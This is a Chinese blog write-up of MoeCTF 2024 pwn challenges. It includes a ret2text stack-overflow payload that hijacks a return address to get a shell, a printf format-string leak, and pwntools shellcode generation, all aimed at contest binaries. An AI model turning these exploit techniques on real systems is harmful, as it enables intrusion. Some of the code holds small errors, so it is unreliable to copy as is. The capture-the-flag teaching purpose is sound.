---
tags:
  - cyber-security
  - CTF
  - MoeCTF
  - pwn
comments: true
---

# MoeCTF 2024 PWN 部分

本文记载了 MoeCTF 2024 期间做出来的一些题目及其解题过程。

在我看来 PWN 领域的题目的套路多数比较固定，但是涉猎广泛程度不亚于 Misc。最大的难点在于，我们对各种前导知识点都要有一定的了解（例如 C 语言、汇编语言、数据结构、简单逆向等等）。

## 二进制漏洞审计入门指北

欢迎来到 MoeCTF 2024 Pwn！下载下方附件（入门指北），开始你的二进制之旅吧。你还需要通过在线环境获取 flag——这是你得分的唯一途径！与在线环境交流的方式就在指北中，别让它等太久。

---

简单的签到题，帮助简单了解题目容器的连接流程。使用 Tutorial 文件中提供的 Python 脚本，此后的相关动态容器题也可以这么连接：

```python
from pwn import * # pwntools
io = connect('127.0.0.1', <Port>) # 连接远程服务器
io.interactive() # 收获成果
```

同样地，也可以使用 Linux 平台的 `nc` 工具：

```bash
nc 127.0.0.1 <port>
```

执行完毕后，将直接输出 Flag。

## flag_helper

Pwn 太暴力了，这一次先让 flag-helper 助你夺旗吧。

这里提到的 flag-helper 起到一个类似于接口的作用，后期会发现这类交互形式的题目在 PWN 类题中也是占相当一部分，也是比较有趣的题了。

使用连接脚本连接到服务器。输出：

```bash
Welcome to MoeCTF 2024 "Pwn".
Have trouble with flag?
What can I do for you?

1. "Capture the flag."
2. "Goodbye."
3. "V me 50 pts."
4. "Play game with me."
Make your choice.
```

前面三个选项是凑数的，主要利用的是第四项：

```bash
OK. Tell me a file path. I can `read` what others cannot `read`.
```

这里强调的 `read` 对应 C 语言中的 `read()` 函数。输入要让 helper 读取文件的位置。我们最想要的是 `flag`，最后发现要输入 `/flag`。

!!! info "提示"
    对于初入 CTF 的新手来说，直接猜出 flag 的位置不算容易。不过想见这种 PWN 题的容器配置应该会很简单，基本上 flag 位于 `/flag` 或者是 `/tmp/flag`。

```bash
Now, give me `flags` for this to-be-opened file.
```

这里的 `flags` 可能对应着 `open()` 函数的参数。在 man7 中查找 `open()`，发现函数的参数之一为 `int flags`，可以选用 `O_RDONLY`、`O_WRONLY` 或 `O_RDWR`。输入这些量会发现并不会被接受，我们需要找到它们对应的整数值。

比赛期间没在网上找到各个对应整数的文档，于是去查看 glibc 的源码。借助手册页里记载的 `#include` 语句，找到对应的文件与代码段：

```c
/*File access modes for `open' and`fcntl'.  */
# define        O_RDONLY        0        /* Open read-only.  */
# define        O_WRONLY        1        /* Open write-only.  */
# define        O_RDWR                2        /* Open read/write.*/
```

!!! info "提示"
    一般情况下如果你能接触到 Linux 系统平台，可以使用预装的 `man` 功能读取安装的手册页面，其中也包含许多相关的 C 函数文档。

    如果要了解这些函数的用法以及实例，可以考虑在 man7 等等网站在线搜索。

考虑到一般情况下 flag 为只读，输入 `O_RDONLY` 对应的 0。其他的值则会导致“权限被拒绝”错误。

```bash
Opened file /dev/random.
Opened file /dev/urandom.
Opened file /flag.
Opened file /dev/zero.

Then we have to `mmap` a place for the content... How do we `prot` it?
```

`mmap()` 同样也是 C 语言函数，其中有参数 `int prot, int flags, int fd`（下面会考），查找对应源码：

```c
/*Protections are chosen from these bits, OR'd together.  The
   implementation does not necessarily support PROT_EXEC or PROT_WRITE
   without PROT_READ.  The only guarantees are that no writing will be
   allowed without PROT_WRITE and no access will be allowed for PROT_NONE.*/

# define        PROT_NONE         0x00        /*No access.  */
# define        PROT_READ         0x04        /* Pages can be read.  */
# define        PROT_WRITE         0x02        /* Pages can be written.  */
# define        PROT_EXEC         0x01        /* Pages can be executed.*/

/*Flags contain mapping type, sharing type and options.*/

/*Mapping type (must choose one and only one of these).  */
# define MAP_FILE         0x0001        /* Mapped from a file or device.  */
# define MAP_ANON         0x0002        /* Allocated from anonymous virtual memory.  */
# define MAP_TYPE         0x000f        /* Mask for type field.  */
# define MAP_ANONYMOUS         MAP_ANON /* Linux name.*/

/*Sharing types (must choose one and only one of these).  */
# define MAP_COPY         0x0020        /* Virtual copy of region at mapping time.  */
# define        MAP_SHARED         0x0010        /* Share changes.  */
# define        MAP_PRIVATE         0x0000        /* Changes private; copy pages on write.*/
```

常见的不同状态用**按位或**运算来叠加。我们需要对 flag 有全权访问，因此这里填入7。

!!! info "问题"
    有点记不太清楚，读取这个 flag 文件是否真的需要写入与执行权限，可能是不需要的。

```bash
And, `flags`. (Calm down, your flag is on the way.)
```

对于 `flags` 参数，源码中要求我们必须将上述两种类型各选其一组合使用（依然使用按位或）。由于我们之前使用 `open()` 将文件存入了内存（属于虚拟空间），因此这里要选用 `MAP_ANON` 与 `MAP_COPY`（文件以只读形式打开，我们不需要，也无权做改动），或运算得到34，填入：

```bash
Coming in three!
Two...
Oonnne...
... I forgot the `fd` to read from. Do you still remember?
```

上面的 `fd` 指的是**文件描述符 (File Descriptor)**，也就是说需要找到 `flag` 文件对应的描述符编号。

程序运行过程中，文件描述符从 0 开始编号，在初始化时会先打开 `STDIN`、`STDOUT`、`STDERR` 三个文件描述符，按照前文命令输出的顺序，可以得到 `/flag` 文件对应的 `fd` 值为 5。

```bash
Oh, yes yeah, 5.
Finally, here you are.
```

在此之后就可以得到flag。如果对其他几个描述符有兴趣也可以输入尝试一下，不过有引发程序出错的可能。

## NotEnoughTime

在正式开始 Pwn 之前，我需要先检测一下你的数学 (?) 能力...

使用连接脚本连接到服务器，输出：

```bash
Test start, you have only 30 seconds.
Let's begin with simple ones.
1 + 1 = $ 2
4 / 3 - 1 = $ 0
OK, then some tough ones. Be WELL PREPARED!
```

后续算式完全是随机生成，所有题目的答题时间仅有30秒，可见需要自动化的手段来处理算式输入与结果输出。

发现如果直接调用 Python 的 `eval()` 函数，计算整数除法不会取整，而是返回了一个小数；因此我们暂时转而使用 Linux 系统自带的计算工具 `bc`。在这里使用 Python 脚本：

!!! info "提示"
    后期查证之后，发现 Python 有 `round()` 函数可以实现小数的四舍五入取整，使用 `int` 强制转换类型的结果与 `bc` 的整除效果相同，因此使用 Python 环境去做是完全有可能的。

```python
from pwn import * # Import pwntools
import re # Regex module
import subprocess

def isMatch(s: str):
    # 正则表达式模式，匹配只包含数字、加减乘除、空格和等号的字符串
    pattern = r'^[\d+\-*/=\s]+$'

    # 使用re.fullmatch检查整个字符串是否符合正则表达式的模式
    if re.fullmatch(pattern, s):
        return True
    else:
        return False

io = connect('127.0.0.1', 45013) # 启动程序
rs = ""
rtable: str = ""

while (not io.closed["recv"]):
    rs = io.recv(timeout=1000)
    if (rs.decode() == ""): continue
    table = rs.decode().split('\n')
    for i in table:
        pattern = r'^[\d+\-*/\s]+$'
        if re.fullmatch(pattern, i):
            rtable += i
        elif isMatch(i):
            rtable += i.split['='](0)
            extproc = subprocess.run(str.format("echo \'{}\' | bc", rtable),
                                     capture_output = True, text = True, shell = True)
            print("We got:  ", extproc.stdout.strip())
            io.sendline(extproc.stdout.strip())
            rtable = ""
        # print(i)
    print("rtable: ", rtable)
    print(table)
```

这段脚本的大致思路如下：

- 循环从 `io` 读取新字符串，最长等待时间为 1000 毫秒；
- 接收到字符串后，先判断有无非正常字符（数字、空格、计算符之外，不包括等号）同时排除空串，保留纯算式，拼接以便后用；
- 如果读到等号，说明一道题目输出完了，就把算式合并起来；
- 使用 `subprocess` 将算式字符串用管道传给 `bc`，获取返回值；
  - 出于上面的提示，也可以使用 `eval()` 函数实现这一点；
- 把返回值发送给 `io` 服务器。

```python
rtable:
['你过关。', '']
```

## no_more_gets

> Never use this function. -- Linux manual page

我设计了一个我自己都打不开的密码锁，你想看看吗？别把它玩坏了。

!!! info "相关知识点"

    函数调用约定

- 可以参照 PWN 指北上的内容，流程大抵相似
- 下载并解压附件，用 IDA64 反编译
- 检查二进制特性

```bash
$ checksec --file=lockedshell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols FORTIFY  Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   34 Symbols         No    0               1               lockedshell
```

- 发现栈溢出保护与 PIE 保护已经关闭，可以用 ret2text 方式攻击
- 在函数列表中找到 my_shell，记下对应地址 0x401176
- 切换到伪代码视图，使用 `gets()` 的有 `char s2[80]`
- 用带 pwndbg 插件的 gdb 调试 lockedshell：

```bash
────────────────────────────────────────────[ STACK ]────────────────────────────────────────────
00:0000│ rbp rsp 0x7fffffffd9a0 —▸ 0x7fffffffda50 —▸ 0x7fffffffdaf0 —▸ 0x7fffffffdb50 ◂— 0
01:0008│+008     0x7fffffffd9a8 —▸ 0x401254 (main+78) ◂— lea rcx, [rbp - 0x50]
02:0010│+010     0x7fffffffd9b0 ◂— 0x979e42599416fa29
03:0018│+018     0x7fffffffd9b8 ◂— 0x3d6a5312ea2d8e39
04:0020│+020     0x7fffffffd9c0 ◂— 0x9fb33274d366f674
05:0028│+028     0x7fffffffd9c8 ◂— 0xf22e06e687f51f5
06:0030│+030     0x7fffffffd9d0 ◂— 0xa1023253596e423e
07:0038│+038     0x7fffffffd9d8 ◂— 0x718332fc57dc7805
```

- 可见 `rbp` 大小为 8，编写攻击代码：

```python
from pwn import * # Import pwntools

io = process('./lockedshell') # 做题时请手动换成服务器地址
backdoor_address = 0x00401176 # 刚才获得的 `backdoor` 地址
backdoor_address += 1 # TODO 施法
payload = cyclic(80) # 填满 `s2`
payload += cyclic(0x8) # 填满 `rbp`
payload += p64(backdoor_address) # 篡改返回地址
io.sendlineafter(b'\n', payload) # 待输出至 `\n` 后输入 payload
io.interactive() # Get shell
```

- 获得 shell 后，使用正常操作获取当前目录下的 flag：

```bash
cat flag
```

## Moeplane

飞机出现严重故障，即将坠毁。作为机长的你能否挽救机上所有人的性命？

附件图片给出的结构体如下：

```c
/* Size: 24 bytes, alignment 8 bytes */
struct airplane {
  /* It's a */ long flight;
  int altitude;
  int velocity;
  int angel;
  unsigned char engine_thrust[ENGINES];
} moeplane;
```

!!! info "相关知识点"
    - 结构体数据存储与空间对齐
    - 数组越界
    - 小端序

    更多的相关内容会在后续补全。

连接至服务器，输出：

```bash
The plane is about to crash. Do something!
[CTR] Fly to airport at 69259509840.
[Meters]
  Altitude: 10000
  Velocity: 300
  Bank angle: 0
  Thrust: engine#1: 20; engine#2: 20; engine#3: 20; engine#4: 20;
[Navigator]
  Flight: 0
  Target: 69259509840
[MoePlane Console]
  0. Check the meters.

  1. Adjust engine thrust.
  2. Adjust trim.
  3. Win the game!
Make your choice:
```

- 无法通过手动正常控制使飞机正确着陆。
- 所有引擎熄火后，飞机速度恒为 80。
- 两个解决方向：
  - 修改当前海拔 `altitude` 尽可能高
  - 修改当前里程：这里不能设置得太大，有条件检测判断

```bash
> [TWR] Clear to land.
Whoo, we are alive...
Raise the flag!
```

## leak_sth

简单的猜数字，够幸运就来试试吧。

- checksec检查属性：Full RELRO, Canary, NX, PIE
- main函数伪代码：

```c
unsigned __int64 func()
{
  unsigned int v0; // eax
  __int64 v2; // [rsp+0h] [rbp-40h] BYREF
  __int64 v3; // [rsp+8h] [rbp-38h]
  char buf[40]; // [rsp+10h] [rbp-30h] BYREF
  unsigned__int64 v5; // [rsp+38h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  v0 = time(0LL);
  srand(v0);
  v3 = rand();
  puts("Welcome to MoeCTF 2024");
  puts("What's your name?");
  read(0, buf, 0x20uLL);
  puts("Your name:");
  printf(buf);
  puts("Give me the number");
  __isoc99_scanf("%ld", &v2);
  if ( v3 == v2 ) // 输入数值与随机数相同
    backdoor();
  else
    puts("Nice try");
  return v5 - __readfsqword(0x28u);
}
```

- 使用printf直接输出输入内容，可使用%p格式化输出指针信息（TODO: 哪个对应指针？我们如何利用这个指针地址？）

```bash
What's your name?
$ %p
Your name:
0x7fb88b1c0643
```

- `__isoc99_scanf` 据说没有写入的字节数限制，因此可以用于溢出（这边用不到）
- 我们是否需要绕过 canary？不用
- 根据栈空间数据的分配原理，可尝试使用 `%p` 顺次输出向低地址方向的十六进制数据

```bash
Your name:
0x1
0x1
0x7f979299d887
0xa
0x7f9792aa3280
0x7f9792aa4780
0x503526cf // 我们需要的随机数区间
0x7025702570257025 // 0x p%，输入区间
0x7025702570257025
_\xfe\x7f
```

- `0x7025` 对应 `p%`，后续输出的是输入区变量 `buf` 的值
- 将随机数的十六进制数值转化即可获得 shell

## 这是什么？shellcode

计算机能直接执行但人类不可读的东西叫机器码，shellcode 就是用于 getshell 的机器（汇编）码。如果能输入并将程序执行流劫持至 shellcode 就太好了。

> pwntools shellcraft 模块确实好用，但是请试着自己手写一个 shellcode 吧！

虽然但是，使用 `pwntools` 生成汇编代码的脚本如下：

```python
from pwn import *

context(arch = "amd64", bits = 64, os = "linux")

ss = asm(shellcraft.amd64.sh())
io.sendafter(">", ss)

io.interactive()
```

对于 shellcode 的编写，可以考虑看看汇编语言。
